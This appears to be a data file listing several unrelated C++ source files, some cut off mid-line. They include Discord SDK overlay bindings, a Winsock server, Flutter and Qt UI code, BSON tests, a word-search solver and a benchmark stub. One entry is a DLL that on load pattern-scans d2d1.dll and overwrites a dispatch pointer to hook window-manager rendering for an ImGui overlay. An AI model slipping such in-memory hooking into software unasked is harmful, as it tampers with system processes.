    "#if !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"overlay_manager.h\"\n\n#include \"core.h\"\n\n#include <cstring>\n#include <memory>\n\nnamespace discord {\n\nclass OverlayEvents final {\npublic:\n    static void DISCORD_CALLBACK OnToggle(void* callbackData, bool locked)\n    {\n        auto* core = reinterpret_cast<Core*>(callbackData);\n        if (!core) {\n            return;\n        }\n\n        auto& module = core->OverlayManager();\n        module.OnToggle((locked != 0));\n    }\n};\n\nIDiscordOverlayEvents OverlayManager::events_{\n  &OverlayEvents::OnToggle,\n};\n\nvoid OverlayManager::IsEnabled(bool* enabled)\n{\n    if (!enabled) {\n        return;\n    }\n\n    internal_->is_enabled(internal_, reinterpret_cast<bool*>(enabled));\n}\n\nvoid OverlayManager::IsLocked(bool* locked)\n{\n    if (!locked) {\n        return;\n    }\n\n    internal_->is_locked(internal_, reinterpret_cast<bool*>(locked));\n}\n\nvoid OverlayManager::SetLocked(bool locked, std::function<void(Result)> callback)\n{\n    static auto wrapper = [](void* callbackData, EDiscordResult result) -> void {\n        std::unique_ptr<std::function<void(Result)>> cb(\n          reinterpret_cast<std::function<void(Result)>*>(callbackData));\n        if (!cb || !(*cb)) {\n            return;\n        }\n        (*cb)(static_cast<Result>(result));\n    };\n    std::unique_ptr<std::function<void(Result)>> cb{};\n    cb.reset(new std::function<void(Result)>(std::move(callback)));\n    internal_->set_locked(internal_, (locked ? 1 : 0), cb.release(), wrapper);\n}\n\nvoid OverlayManager::OpenActivityInvite(ActivityActionType type,\n                                        std::function<void(Result)> callback)\n{\n    static auto wrapper = [](void* callbackData, EDiscordResult result) -> void {\n        std::unique_ptr<std::function<void(Result)>> cb(\n          reinterpret_cast<std::function<void(Result)>*>(callbackData));\n        if (!cb || !(*cb)) {\n            return;\n        }\n        (*cb)(static_cast<Result>(result));\n    };\n    std::unique_ptr<std::function<void(Result)>> cb{};\n    cb.reset(new std::function<void(Result)>(std::move(callback)));\n    internal_->open_activity_invite(\n      internal_, static_cast<EDiscordActivityActionType>(type), cb.release(), wrapper);\n}\n\nvoid OverlayManager::OpenGuildInvite(char const* code, std::function<void(Result)> callback)\n{\n    static auto wrapper = [](void* callbackData, EDiscordResult result) -> void {\n        std::unique_ptr<std::function<void(Result)>> cb(\n          reinterpret_cast<std::function<void(Result)>*>(callbackData));\n        if (!cb || !(*cb)) {\n            return;\n        }\n        (*cb)(static_cast<Result>(result));\n    };\n    std::unique_ptr<std::function<void(Result)>> cb{};\n    cb.reset(new std::function<void(Result)>(std::move(callback)));\n    internal_->open_guild_invite(internal_, const_cast<char*>(code), cb.release(), wrapper);\n}\n\nvoid OverlayManager::OpenVoiceSettings(std::function<void(Result)> callback)\n{\n    static auto wrapper = [](void* callbackData, EDiscordResult result) -> void {\n        std::unique_ptr<std::function<void(Result)>> cb(\n          reinterpret_cast<std::function<void(Result)>*>(callbackData));\n        if (!cb || !(*cb)) {\n            return;\n        }\n        (*cb)(static_cast<Result>(result));\n    };\n    std::unique_ptr<std::function<void(Result)>> cb{};\n    cb.reset(new std::function<void(Result)>(std::move(callback)));\n    internal_->open_voice_settings(internal_, cb.release(), wrapper);\n}\n\nResult OverlayManager::InitDrawingDxgi(IDXGISwapChain* swapchain, bool useMessageForwarding)\n{\n    auto result =\n      internal_->init_drawing_dxgi(internal_, swapchain, (useMessageForwarding ? 1 : 0));\n    return static_cast<Result>(result);\n}\n\nvoid OverlayManager::OnPresent()\n{\n    internal_->on_present(internal_);\n}\n\nvoid OverlayManager::ForwardMessage(MSG* message)\n{\n    internal_->forward_message(internal_, message);\n}\n\nvoid OverlayManager::KeyEvent(bool down, char const* keyCode, KeyVariant variant)\n{\n    internal_->key_event(internal_,\n                         (down ? 1 : 0),\n                         const_cast<char*>(keyCode),\n                         static_cast<EDiscordKeyVariant>(variant));\n}\n\nvoid OverlayManager::CharEvent(char const* character)\n{\n    internal_->char_event(internal_, const_cast<char*>(character));\n}\n\nvoid OverlayManager::MouseButtonEvent(std::uint8_t down,\n                                      std::int32_t clickCount,\n                                      MouseButton which,\n                                      std::int32_t x,\n                                      std::int32_t y)\n{\n    internal_->mouse_button_event(\n      internal_, down, clickCount, static_cast<EDiscordMouseButton>(which), x, y);\n}\n\nvoid OverlayManager::MouseMotionEvent(std::int32_t x, std::int32_t y)\n{\n    internal_->mouse_motion_event(internal_, x, y);\n}\n\nvoid OverlayManager::ImeCommitText(char const* text)\n{\n    internal_->ime_commit_text(internal_, const_cast<char*>(text));\n}\n\nvoid OverlayManage",
    "#include<winsock2.h>\n#include<iostream>\nusing namespace std;\n\nstruct sockaddr_in srv;\n#define PORT 9909\n\nint main()\n{\n    int nRet=0;\n     WSADATA wsaData;\n    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {\n        cout << \"Winsock initialization failed\" << endl;\n       \n    }\n\n    int nSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);\n    if(nSocket<0)\n    { cout<<\"Not Open\\n\";\n        exit(EXIT_FAILURE);\n    }\n    else cout<<\"SOcket Open \"<<nSocket<<endl;\n\n    //Initializing the enviorment for sockaddr structure \n    srv.sin_family=AF_INET;\n    srv.sin_port=htons(PORT);\n    srv.sin_addr.s_addr=INADDR_ANY;\n    memset(&(srv.sin_zero),0,8);\n\n    //Bind the socket to local port\n    nRet=bind(nSocket,(sockaddr*)&srv, sizeof(sockaddr));\n    if(nRet<0)\n    {\n        cout<<\"Failed to bind to local port \"<<endl;\n        exit(EXIT_FAILURE);\n    }\n    else\n    {\n        cout<<\"Successfully bind to local port\\n\";\n         \n    }\n    nRet=listen(nSocket,5);  // here 5 means backlog i.e it can reciever up to 5 request at a time more than that will be in wait quqeue\n        if(nRet<0)\n        {\n            cout<<\"Failed to listen to local port \"<<endl;\n            exit(EXIT_FAILURE);\n        }\n        else\n        {\n            cout<<\"Successfully listening to local port\\n\";\n            \n        }\n    \n\n\n\n     WSACleanup();\n    return 0;\n\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"blog_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"cpp-bson-convert.hpp\"\n\n#include <gtest/gtest.h>\n#include <bsoncxx/json.hpp>\n\nusing namespace sselibs;\n\nTEST(PrimitiveTypeTest, Deserialization)\n{\n    struct AllTypes\n    {\n        bsoncxx::oid id;\n        bool boolean;\n        int integer;\n        double floatingPoint;\n        std::string string;\n        std::vector<int> intArray;\n        std::vector<std::string> stringArray;\n        std::optional<int> optionalInt;\n        std::optional<std::string> optionalString;\n\n        BSON_DEFINE_TYPE(AllTypes, id, boolean, integer, floatingPoint, string, intArray, stringArray, optionalInt, optionalString)\n    };\n\n    AllTypes allTypes;\n    allTypes.id = bsoncxx::oid();\n    allTypes.boolean = true;\n    allTypes.integer = 42;\n    allTypes.floatingPoint = 3.14;\n    allTypes.string = \"Hello, World!\";\n    allTypes.intArray = {1, 2, 3, 4, 5};\n    allTypes.stringArray = {\"one\", \"two\", \"three\", \"four\", \"five\"};\n    allTypes.optionalInt = 42;\n\n    const auto bson = AllTypes::toBSON(allTypes);\n    const auto deserialized = AllTypes::fromBSON(bson);\n\n    ASSERT_EQ(allTypes.id, deserialized.id);\n    ASSERT_EQ(allTypes.boolean, deserialized.boolean);\n    ASSERT_EQ(allTypes.integer, deserialized.integer);\n    ASSERT_EQ(allTypes.floatingPoint, deserialized.floatingPoint);\n    ASSERT_EQ(allTypes.string, deserialized.string);\n    ASSERT_EQ(allTypes.intArray, deserialized.intArray);\n    ASSERT_EQ(allTypes.stringArray, deserialized.stringArray);\n    ASSERT_EQ(allTypes.optionalInt, deserialized.optionalInt);\n    ASSERT_EQ(allTypes.optionalString, deserialized.optionalString);\n}\n\nTEST(PrimitiveTypeTest, Serialization)\n{\n    struct AllTypes\n    {\n        bsoncxx::oid id;\n        bool boolean;\n        int integer;\n        double floatingPoint;\n        std::string string;\n        std::vector<int> intArray;\n        std::vector<std::string> stringArray;\n        std::optional<int> optionalInt;\n        std::optional<std::string> optionalString;\n\n        BSON_DEFINE_TYPE(AllTypes, id, boolean, integer, floatingPoint, string, intArray, stringArray, optionalInt, optionalString)\n    };\n\n    AllTypes allTypes;\n    allTypes.id = bsoncxx::oid();\n    allTypes.boolean = true;\n    allTypes.integer = 42;\n    allTypes.floatingPoint = 3.14;\n    allTypes.string = \"Hello, World!\";\n    allTypes.intArray = {1, 2, 3, 4, 5};\n    allTypes.stringArray = {\"one\", \"two\", \"three\", \"four\", \"five\"};\n    allTypes.optionalInt = 42;\n\n    const auto bson = AllTypes::toBSON(allTypes);\n    auto view = bson.view();\n\n    ASSERT_EQ(allTypes.id, bson[\"id\"].get_oid().value);\n    ASSERT_EQ(allTypes.boolean, bson[\"boolean\"].get_bool().value);\n    ASSERT_EQ(allTypes.integer, bson[\"integer\"].get_int32().value);\n    ASSERT_EQ(allTypes.floatingPoint, bson[\"floatingPoint\"].get_double().value);\n    ASSERT_EQ(allTypes.string, std::string(bson[\"string\"].get_string().value));\n    const auto intArray = bson[\"intArray\"].get_array().value;\n    for (size_t i = 0; i < allTypes.intArray.size(); ++i)\n    {\n        ASSERT_EQ(allTypes.intArray[i], intArray[i].get_int32().value);\n    }\n    const auto stringArray = bson[\"stringArray\"].get_array().value;\n    for (size_t i = 0; i < allTypes.stringArray.size(); ++i)\n    {\n        ASSERT_EQ(allTypes.stringArray[i], std::string(stringArray[i].get_string().value));\n    }\n    ASSERT_TRUE(view.find(\"optionalInt\") != view.end());\n    ASSERT_EQ(allTypes.optionalInt, bson[\"optionalInt\"].get_int32().value);\n    ASSERT_TRUE(view.find(\"optionalString\") == view.end());\n\n}\n\nTEST(NestedClassTest, Deserialization)\n{\n    struct NestedClass\n    {\n        struct Inner\n        {\n            int x;\n            int y;\n\n            BSON_DEFINE_TYPE(Inner, x, y)\n        };\n\n        Inner inner;\n        std::string name;\n\n        BSON_DEFINE_TYPE(NestedClass, inner, name)\n    };\n\n    NestedClass nestedClass;\n    nestedClass.inner.x = 42;\n    nestedClass.inner.y = 24;\n    nestedClass.name = \"NestedClass\";\n\n    const auto bson = NestedClass::toBSON(nestedClass);\n    const auto deserialized = NestedClass::fromBSON(bson);\n\n    ASSERT_EQ(nestedClass.inner.x, deserialized.inner.x);\n    ASSERT_EQ(nestedClass.inner.y, deserialized.inner.y);\n    ASSERT_EQ(nestedClass.name, deserialized.name);\n}\n\nTEST(NestedClassTest, Serialization)\n{\n    struct NestedClass\n    {\n        struct Inner\n        {\n            int x;\n            int y;\n\n            BSON_DEFINE_TYPE(Inner, x, y)\n        };\n\n        Inner inner;\n        std::string name;\n\n        BSON_DEFINE_TYPE(NestedClass, inner, name)\n    };\n\n    NestedClass nestedClass;\n    nestedClass.inner.x = 42;\n    nestedClass.inner.y = 24;\n    nestedClass.name = \"NestedClass\";\n\n    const auto bson = NestedClass::toBSON(nestedClass);\n    ASSERT_EQ(nestedClass.name, std::string(bson[\"name\"].get_string().value));\n    ASSERT_EQ(nestedClass.inner.x, bson[\"inner\"][\"x\"].get_int32().value);\n    ASSERT_EQ(nestedClass.inner.y, bson[\"inner\"][\"y\"].get_int32().value);\n\n}\n\nTEST(NestedClassArrayTest, Deserialization)\n{\n    struct NestedClass\n    {\n        s",
    "#include \"registerloginwindow.h\"\n#include \"ui_registerloginwindow.h\"\n#include \"imgbutton.h\"\n#include \"user.h\"\n#include \"qdebug.h\"\n\nRegisterLoginWindow::RegisterLoginWindow(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::RegisterLoginWindow)\n{\n    ui->setupUi(this);\n    // \u6ce8\u518c|\u767b\u5f55\u6309\u94ae\u5b9e\u4f8b\u5316\n    ImgButton *registerButton = new ImgButton(\":/res/register.png\", \":/res/ButtonSound.wav\");\n    ImgButton *loginButton = new ImgButton(\":/res/login.png\", \":/res/ButtonSound.wav\");\n\n    // \u6ce8\u518c\u6309\u94ae\n    registerButton->setParent(this);\n    registerButton->move(this->width()*0.35, this->height()*0.6);\n    registerButton->show();\n\n    // \u767b\u5f55\u6309\u94ae\n    loginButton->setParent(this);\n    loginButton->move(this->width()*0.58, this->height()*0.6);\n    loginButton->show();\n\n    // \u6839\u636e\u8d44\u6e90\u6587\u4ef6\u4e2d\u7d22\u5f15\u7684\u7528\u6237\u4fe1\u606f\u6587\u4ef6\u521b\u5efa\u53ef\u5199\u5165\u526f\u672c\n    if (!User::initializeUserFile()) {\n        QMessageBox::critical(nullptr, \"\u9519\u8bef\", \"\u7528\u6237\u6587\u4ef6\u521d\u59cb\u5316\u5931\u8d25\");\n        exit(0);\n    }\n\n    // \u6ce8\u518c\u6309\u94ae\u52a8\u753b\u5b9e\u73b0\n    connect(registerButton, &ImgButton::clicked, [=](){\n        //\u6309\u94ae\u5f39\u8df3\n        registerButton->buttonDown();\n        registerButton->buttonUp();\n        onRegisterButtonClicked();  // \u8c03\u7528\u6ce8\u518c\u51fd\u6570\n    });\n\n    // \u767b\u5f55\u6309\u94ae\u52a8\u753b\u5b9e\u73b0\n    connect(loginButton, &ImgButton::clicked, [=](){\n        //\u6309\u94ae\u5f39\u8df3\n        loginButton->buttonDown();\n        loginButton->buttonUp();\n        onLoginButtonClicked();  // \u8c03\u7528\u767b\u5f55\u51fd\u6570\n    });\n}\n\nRegisterLoginWindow::~RegisterLoginWindow()\n{\n    delete ui;\n}\n\n// \u7ed8\u5236\u80cc\u666f\nvoid RegisterLoginWindow::paintEvent(QPaintEvent *)\n{\n    QPainter painter(this);\n    painter.drawPixmap(0, 0, width(), height(), QPixmap(\":/res/rlbp.jpg\"));\n}\n\nvoid RegisterLoginWindow::onRegisterButtonClicked()\n{\n    QString username = ui->userName->text(); // \u83b7\u53d6\u7528\u6237\u540d\n    QString password = ui->userPassword->text(); // \u83b7\u53d6\u5bc6\u7801\n\n    User newUser(username, password); // \u521b\u5efa\u7528\u6237\u5bf9\u8c61\n    // qDebug() << username << \",\" << password;\n    // \u6ce8\u518c\u7528\u6237\n    if (newUser.registerUser()) {\n        // \u7528\u6237\u6ce8\u518c\u6210\u529f \u6216 \u7528\u6237\u4fe1\u606f\u5df2\u5b58\u5728\n    }\n}\n\nvoid RegisterLoginWindow::onLoginButtonClicked()\n{\n    QString username = ui->userName->text(); // \u83b7\u53d6\u7528\u6237\u540d\n    QString password = ui->userPassword->text(); // \u83b7\u53d6\u5bc6\u7801\n    // \u53ea\u5728\u7b2c\u4e00\u6b21\u8c03\u7528\u65f6\u521d\u59cb\u5316\u5bf9\u8c61\n    static User newUser(username, password); // \u521b\u5efa\u7528\u6237\u5bf9\u8c61\n\n    // \u786e\u4fdd\u7528\u6237\u8f93\u5165\u9519\u8bef\u68c0\u6d4b\u6b63\u5e38\u8fd0\u884c\n    if(!isFirstLogin){\n        newUser.setUsername(username);\n        newUser.setPassword(password);\n    }else{\n        isFirstLogin = false;\n    }\n    // \u7528\u6237\u767b\u5f55\n    if(newUser.login()){\n        // \u7528\u6237\u767b\u5f55\u6210\u529f\n        QMessageBox::information(nullptr, \"\u6210\u529f\", \"\u606d\u559c\u60a8\uff0c\u767b\u5f55\u6210\u529f\uff01\");\n        // \u629b\u51fa\u7528\u6237\u767b\u5f55\u6210\u529f\u4fe1\u606f\n        emit loginSuccess();\n    }\n\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include \"grid.h\"\r\n\r\n//8 possible directions for a word to go\r\nconst std::string alpha = \"abcdefghijklmnopqrstuvwxyz\"; \r\nconst int dx[] = {1, -1, 0, 0, 1, 1, -1, -1}; \r\nconst int dy[] = {0, 0, 1, -1, 1, -1, 1, -1};\r\nstd::vector<Grid> solutions = std::vector<Grid>(); \r\nstd::vector<std::string> wordList, xList; \r\nint r, c; \r\n\r\n//read input file - set width, height, required word list, and forbidden word list\r\nvoid readWordList(std::string input) {\r\n\tstd::ifstream inputFile(input); \r\n\tstd::string word;\r\n\tchar ch; \r\n\tinputFile >> c >> r; \r\n\twhile (inputFile >> ch >> word) {\r\n\t\tif (ch == '+') {\r\n\t\t\twordList.push_back(word); \r\n\t\t}\r\n\t\telse {\r\n\t\t\txList.push_back(word); \r\n\t\t}\r\n\t}\r\n}\r\n\r\nbool hasForbWords(Grid grid) {\r\n\tfor (int i = 0; i < r; i++) {\r\n\t\tfor (int j = 0; j < c; j++) {\r\n\t\t\tfor (int d = 0; d < 8; d++) {\r\n\t\t\t\tint nx = i; \r\n\t\t\t\tint ny = j;\r\n\t\t\t\tstd::string word; \r\n\t\t\t\twhile (nx >= 0 && nx < r && ny >= 0 && ny < c) {\r\n\t\t\t\t\tword += grid.getChar(nx, ny); \r\n\t\t\t\t\tif (std::find(xList.begin(), xList.end(), word) != xList.end()) {\r\n\t\t\t\t\t\treturn true; \r\n\t\t\t\t\t} \r\n\t\t\t\t\tnx += dx[d]; \r\n\t\t\t\t\tny += dy[d];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn false; \t\t\t\r\n}\t\r\n\r\nbool gridFilled(Grid grid) {\r\n\tfor (int i = 0; i < r; i++) {\r\n\t\tfor (int j = 0; j < c; j++) {\r\n\t\t\tif (grid.getChar(i, j) == '.') {\r\n\t\t\t\treturn false; \r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn true; \r\n}\r\n\r\nbool wordFits(Grid grid, int direction, int x, int y, int index) {\r\n\tstd::string word = wordList[index];\r\n\tint len = word.length(); \r\n\tfor (int i = 0; i < len; i++) {\r\n\t\tint nx = x + i * dx[direction]; \r\n\t\tint ny = y + i * dy[direction]; \r\n\t\tif (nx < 0 || ny < 0 || nx >= r || ny >= c || (grid.getChar(nx, ny) != '.' && grid.getChar(nx, ny) != word[i])) {\r\n\t\t\treturn false; \r\n\t\t}\r\n\t}\r\n\treturn true; \r\n}\r\n\r\nGrid placeWord(Grid grid, int direction, int x, int y, int index) {\r\n\tstd::string word = wordList[index]; \r\n\tint len = word.length(); \r\n\tfor (int i = 0; i < len; i++) {\r\n\t\tint nx = x + i * dx[direction]; \r\n\t\tint ny = y + i * dy[direction];\r\n\t\tgrid.setChar(nx, ny, word[i]); \r\n\t}\r\n\treturn grid; \r\n}\r\n\r\nvoid recurAlphabet(Grid grid) {\r\n\tif (gridFilled(grid)) {\r\n\t\tfor (Grid g: solutions) {\r\n\t\t\tif (g == grid) {\r\n\t\t\t\treturn; \r\n\t\t\t}\r\n\t\t}\r\n\t\tsolutions.push_back(grid); \r\n\t\treturn; \r\n\t}\r\n\tint row, col; \r\n\tfor (int i = 0; i < r; i++) {\r\n\t\tfor (int j = 0; j < c; j++) {\r\n\t\t\tif (grid.getChar(i, j) == '.') {\r\n\t\t\t\trow = i; \r\n\t\t\t\tcol = j; \r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfor (int a = 0; a < 26; a++) {\r\n\t\tgrid.setChar(row, col, alpha[a]); \r\n\t\tif (!hasForbWords(grid)) {\r\n\t\t\trecurAlphabet(grid); \r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid recurGrid(Grid grid, int index) {\r\n\tif (hasForbWords(grid)) {\r\n\t\treturn;\r\n\t}\r\n\tif (gridFilled(grid) && index == (int)wordList.size()) {\r\n\t\tsolutions.push_back(grid); \r\n\t\treturn; \r\n\t}\r\n\tif (!gridFilled(grid) && index == (int)wordList.size()) {\r\n\t\trecurAlphabet(grid); \r\n\t\treturn; \r\n\t}\r\n\tfor (int i = 0; i < r; i++) {\r\n\t\tfor (int j = 0; j < c; j++) {\r\n\t\t\tif (wordFits(grid, 0, i, j, index)) { //vertical \r\n\t\t\t\tGrid g = placeWord(grid, 0, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 1, i, j, index)) { //reverse vertical\r\n\t\t\t\tGrid g = placeWord(grid, 1, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 2, i, j, index)) { //horizontal\r\n\t\t\t\tGrid g =placeWord(grid, 2, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 3, i, j, index)) { //reverse horizonal\r\n\t\t\t\tGrid g = placeWord(grid, 3, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 4, i, j, index)) { //diagonal br\r\n\t\t\t\tGrid g = placeWord(grid, 4, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 5, i, j, index)) { //diagonal bl\r\n\t\t\t\tGrid g = placeWord(grid, 5, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 6, i, j, index)) { //diagonal tr\r\n\t\t\t\tGrid g = placeWord(grid, 6, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t\tif (wordFits(grid, 7, i, j, index)) { //diagonal tl\r\n\t\t\t\tGrid g = placeWord(grid, 7, i, j, index); \r\n\t\t\t\trecurGrid(g, index + 1); \r\n\t\t\t}\r\n\t\t}\r\n\t}\t\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n\tif (argc != 4) {\r\n        std::cerr << \"Usage: \" << argv[0] << \" input_file output_file one_solution|all_solutions\" << std::endl;\r\n        return 1;\r\n    }\r\n\t\r\n\t//command arguments\r\n\tstd::string input = argv[1];\r\n    std::string output = argv[2];\r\n    std::string solutionType = argv[3];\r\n\t\r\n\tstd::ofstream outputFile(output); \r\n\t\r\n\treadWordList(input); \r\n\tGrid grid(r, c);  \r\n\trecurGrid(grid, 0); \r\n\t\r\n\tif (solutionType == \"one_solution\") {\r\n\t\toutputFile << solutions[0]; \r\n\t}\r\n\telse if (solutionType == \"all_solutions\" && !solutions.empty()) {\r\n\t\toutputFile << solutions.size() << \" solution(s)\" << std::endl; \r\n\t\tfor (Grid grid: solutions) {\r\n\t\t\toutputFile << \"Board: \" << std::endl; \r\n\t\t\toutputFile << grid << std::endl; \t\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\toutputFile << \"No solutions found.\" <<std::endl; \r\n\t}\r\n\t\r\n\treturn 0; \r\n}",
    "#include \"main.h\"\r\n#include \"AsmHook.h\"\r\n#include \"Utils.h\"\r\n\r\nUINT64 PresentCall = 0;\r\n\r\nextern \"C\" void Present(IDXGISwapChain* SwapChain) {\r\n\r\n\tif (!ImGui::GetCurrentContext()) {\r\n\r\n\t\tif (SUCCEEDED(SwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&g_pd3dDevice))) {\r\n\r\n\t\t\tg_pd3dDevice->GetImmediateContext(&g_pd3dDeviceContext);\r\n\r\n\t\t\tif (g_pd3dDeviceContext) {\r\n\r\n\t\t\t\tID3D11Texture2D* RenderTargetTexture = 0;\r\n\r\n\t\t\t\tif (SUCCEEDED(SwapChain->GetBuffer(0, IID_PPV_ARGS(&RenderTargetTexture)))) {\r\n\r\n\t\t\t\t\tif (SUCCEEDED(g_pd3dDevice->CreateRenderTargetView(RenderTargetTexture, NULL, &g_mainRenderTargetView))) {\r\n\r\n\t\t\t\t\t\tImGui::CreateContext();\r\n\r\n\t\t\t\t\t\tImGui_ImplWin32_Init(GetDesktopWindow());\r\n\r\n\t\t\t\t\t\tImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);\r\n\r\n\t\t\t\t\t\tImGuiIO& io = ImGui::GetIO();\r\n\r\n\t\t\t\t\t\tio.IniFilename = NULL;\r\n\r\n\t\t\t\t\t\tio.LogFilename = NULL;\r\n\r\n\t\t\t\t\t\tImGui::StyleColorsLight();\r\n\t\t\t\t\t}\r\n\t\t\t\t\tRenderTargetTexture->Release();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tif (ImGui::GetCurrentContext()) {\r\n\r\n\t\tPOINT TempPoint = { 0 };\r\n\r\n\t\tClientToScreen(GetDesktopWindow(), &TempPoint);\r\n\r\n\t\tPOINT CursorPos = { 0 };\r\n\r\n\t\tGetCursorPos(&CursorPos);\r\n\r\n\t\tImGuiIO& io = ImGui::GetIO();\r\n\r\n\t\tio.MousePos = ImVec2(CursorPos.x - TempPoint.x, CursorPos.y - TempPoint.y);\r\n\r\n\t\tio.MouseDown[0] = GetAsyncKeyState(VK_LBUTTON) & 0x8000;\r\n\r\n\t\tImGui_ImplDX11_NewFrame();\r\n\r\n\t\tImGui_ImplWin32_NewFrame();\r\n\r\n\t\tImGui::NewFrame();\r\n\r\n\t\tImGui::Begin(\"Hello, world!\");\r\n\r\n\t\tImGui::Text(\"Gitbub:https://github.com/Yukin02\");\r\n\r\n\t\tImGui::Text(\"Application average %.3f ms/frame (%.1f FPS)\", 1000.0f / ImGui::GetIO().Framerate, ImGui::GetIO().Framerate);\r\n\t\t\r\n\t\tImGui::End();\r\n\r\n\t\tImGui::Render();\r\n\r\n\t\tg_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);\r\n\r\n\t\tImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());\r\n\t}\r\n}\r\n\r\nBOOL InitDwm() {\r\n\r\n\tauto d2d1 = (UINT64)GetModuleHandleA(\"d2d1.dll\");\r\n\r\n\tauto DrawingContext = FindPatternImage(d2d1, \"\\x48\\x8D\\x05\\x00\\x00\\x00\\x00\\x33\\xED\\x48\\x8D\\x71\\x08\", \"xxx????xxxxxx\");\r\n\r\n\tif (!DrawingContext) return FALSE;\r\n\r\n\tDrawingContext += + *(int*)(DrawingContext + 3) + 7;\r\n\r\n\tauto PresentMultiplaneOverlay = ((UINT64*)DrawingContext)[7];\r\n\r\n\tauto LdrpDispatchUserCallTarget = FindPattern(PresentMultiplaneOverlay, 0x50, \"\\xFF\\x15\", \"xx\");\r\n\r\n\tif (!LdrpDispatchUserCallTarget) return FALSE;\r\n\r\n\tPresentCall = LdrpDispatchUserCallTarget + 6;\r\n\r\n\tLdrpDispatchUserCallTarget += +*(int*)(LdrpDispatchUserCallTarget + 2) + 6;\r\n\r\n\tauto Protect = 0ul;\r\n\r\n\tif (VirtualProtect((PVOID)LdrpDispatchUserCallTarget, 8, PAGE_READWRITE, &Protect)) {\r\n\r\n\t\t_InterlockedExchangePointer((PVOID*)LdrpDispatchUserCallTarget, AsmLdrpDispatchUserCallTarget);\r\n\r\n\t\treturn VirtualProtect((PVOID)LdrpDispatchUserCallTarget, 8, Protect, &Protect);\r\n\t}\r\n\treturn TRUE;\r\n}\r\n\r\nBOOL DllMain(HINSTANCE HInstance, UINT32 Reason, PVOID Reserved) {\r\n\r\n\tif (Reason == DLL_PROCESS_ATTACH) InitDwm();\r\n\r\n\treturn TRUE;\r\n}",
    "// Copyright (c) 2024 Marco Fortina\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or https://www.opensource.org/licenses/mit-license.php.\n\n#include <bench.h>\n\n#include <graph.h>\n#include <path.h>\n#include <qyra.h>\n#include <stream.h>\n#include <utils.h>\n\n#include <data/solutions.json.h>\n\n// IWYU pragma: no_include <bits/chrono.h>\n\n#include <chrono> // IWYU pragma: keep\n#include <cstdio>\n#include <iostream>\n#include <limits>\n#include <random>\n#include <string>\n#include <thread>\n#include <vector>\n\n// Define the number of rounds for the loop\n#define NUM_ROUNDS 100\n\n// Define the number of iterations for the loop\n#define NUM_ITERATIONS 100\n\n// Total number of solutions per second generated across all iterations\ndouble totalGeneratedPerSecond = 0.0;\n\n// Total number of solutions per second validated across all iterations\ndouble totalValidatedPerSecond = 0.0;\n\n// Variables to store the minimum and maximum solutions per second\ndouble minGeneratedPerSecond = std::numeric_limits<double>::max();\ndouble maxGeneratedPerSecond = 0.0;\ndouble minValidatedPerSecond = std::numeric_limits<double>::max();\ndouble maxValidatedPerSecond = 0.0;\n\n/**\n * @brief Prints the number of solutions generated or validated per second.\n *\n * @param time Time taken in seconds.\n * @param solutions Number of solutions generated or validated.\n * @param label Descriptive label for the output.\n *\n * @return The calculated solutions per second.\n */\ndouble PrintSolutionsPerSecond(double time, std::size_t solutions, const std::string& label)\n{\n    // Calculate solutions per second\n    double solutionsPerSecond = solutions / time;\n\n    // To hold the suffix for the units\n    std::string suffix;\n\n    // To hold the value to display\n    double displayValue;\n\n    // Determine the appropriate suffix and value based on the number of solutions\n    if (solutionsPerSecond >= 1e9) {\n        // 